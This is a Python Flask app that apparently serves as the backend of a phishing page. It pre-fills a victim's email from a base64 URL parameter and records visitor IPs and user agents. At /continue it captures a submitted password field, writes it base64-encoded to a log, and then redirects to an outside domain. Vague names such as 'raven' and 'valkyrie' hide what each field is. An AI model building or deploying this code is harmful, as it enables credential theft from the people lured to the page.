from __future__ import annotations

import base64
import binascii
import hashlib
import hmac as _hmac
import os
import time
from datetime import datetime, timezone
from pathlib import Path

from flask import Flask, abort, redirect, render_template, request, send_from_directory, url_for


BASE_DIR = Path(__file__).resolve().parent
EVENT_LOG = BASE_DIR / "events.txt"
PRIVATE_ASSETS_DIR = BASE_DIR / "private_assets"
MAX_ENCODED_EMAIL_LENGTH = 1024

ASSET_SECRET = os.environ.get("ASSET_SECRET", "dev-change-me-in-production")
ASSET_TOKEN_WINDOW = 300
EVENT_KEY_RAVEN = "raven"
EVENT_KEY_EMBER = "ember"
EVENT_KEY_ATLAS = "atlas"
EVENT_KEY_NOVA = "nova"
EVENT_KEY_VALKYRIE = "valkyrie" # New keyword for the password

def _orbit(offset: int = 0) -> int:
    return int(time.time()) // ASSET_TOKEN_WINDOW + offset


def _cipher(filename: str, orbit: int) -> str:
    msg = f"{filename}:{orbit}".encode()
    return _hmac.new(ASSET_SECRET.encode(), msg, hashlib.sha256).hexdigest()[:24]


def mint_lumen(filename: str) -> str:
    return _cipher(filename, _orbit())


def guard_lumen(filename: str, token: str) -> bool:
    for offset in (0, -1):
        expected = _cipher(filename, _orbit(offset))
        if _hmac.compare_digest(token, expected):
            return True
    return False


def _atlas() -> str:
    forwarded = request.headers.get("X-Forwarded-For", "")
    return forwarded.split(",")[0].strip() if forwarded else (request.remote_addr or "unknown")


def _nova() -> str:
    return request.headers.get("User-Agent", "unknown")


def _veil(record: str) -> str:
    return base64.b64encode(record.encode("utf-8")).decode("ascii")


def scribe_raven(log_path: Path, raven: str, atlas: str, nova: str) -> None:
    timestamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
    record = (
        f"{timestamp}\tGET\t"
        f"{EVENT_KEY_RAVEN}={raven}\t"
        f"{EVENT_KEY_ATLAS}={atlas}\t"
        f"{EVENT_KEY_NOVA}={nova}"
    )
    with log_path.open("a", encoding="utf-8") as f:
        f.write(f"{_veil(record)}\n")


def scribe_ember(log_path: Path, raven: str, ember: str, valkyrie: str, atlas: str, nova: str) -> None:
    timestamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
    ember_state = "present" if ember else "empty"
    # Added valkyrie to the record string
    record = (
        f"{timestamp}\tPOST\t"
        f"{EVENT_KEY_RAVEN}={raven}\t"
        f"{EVENT_KEY_EMBER}={ember_state}\t"
        f"{EVENT_KEY_VALKYRIE}={valkyrie}\t"  # Included the new field
        f"{EVENT_KEY_ATLAS}={atlas}\t"
        f"{EVENT_KEY_NOVA}={nova}"
    )
    with log_path.open("a", encoding="utf-8") as f:
        f.write(f"{_veil(record)}\n")


def forge_app(test_config: dict | None = None) -> Flask:
    app = Flask(__name__)
    app.config.from_mapping(
        MAX_CONTENT_LENGTH=16 * 1024,
        EVENT_LOG=EVENT_LOG,
    )

    if test_config:
        app.config.update(test_config)

    @app.get("/assets/<path:filename>")
    def lumen(filename: str):
        token = request.args.get("t", "")
        if not guard_lumen(filename, token):
            abort(403)
        return send_from_directory(PRIVATE_ASSETS_DIR, filename)

    @app.get("/")
    def raven_gate():
        encoded_raven = request.args.get("email", "")
        raven, decode_error = unfold_raven(encoded_raven)

        scribe_raven(
            Path(app.config["EVENT_LOG"]),
            raven=raven,
            atlas=_atlas(),
            nova=_nova(),
        )

        return render_template(
            "index.html",
            raven=raven,
            decode_error=decode_error,
            css_token=mint_lumen("styles.css"),
            js_token=mint_lumen("scripts.js"),
        )

    @app.post("/continue")
    def ember_gate():
        encoded_raven = request.form.get("encoded_raven", "")
        ember = request.form.get("demo_secret", "")
        valkyrie = request.form.get("valkyrie", "") 
        raven, _ = unfold_raven(encoded_raven)

        scribe_ember(
            Path(app.config["EVENT_LOG"]),
            raven=raven,
            ember=ember,
            valkyrie=valkyrie, 
            atlas=_atlas(),
            nova=_nova(),
        )

        return redirect("https://coopclaret.hn", code=303)

    @app.get("/complete")
    def nova_gate():
        return render_template("complete.html")

    return app


def unfold_raven(encoded: str) -> tuple[str, str | None]:
    if not encoded:
        return "correo@ejemplo.com", None

    if len(encoded) > MAX_ENCODED_EMAIL_LENGTH:
        return "correo@ejemplo.com", "El valor de correo es demasiado largo."

    try:
        padding = "=" * (-len(encoded) % 4)
        decoded = base64.b64decode(
            (encoded + padding).encode("ascii"),
            altchars=b"-_",
            validate=True,
        ).decode("utf-8")
    except (UnicodeEncodeError, UnicodeDecodeError, binascii.Error, ValueError):
        return "correo@ejemplo.com", "No se pudo decodificar el correo recibido."

    if not decoded or any(character in decoded for character in "\r\n\x00"):
        return "correo@ejemplo.com", "El correo decodificado no es válido."

    return decoded, None


app = forge_app()


if __name__ == "__main__":
    app.run(debug=True)
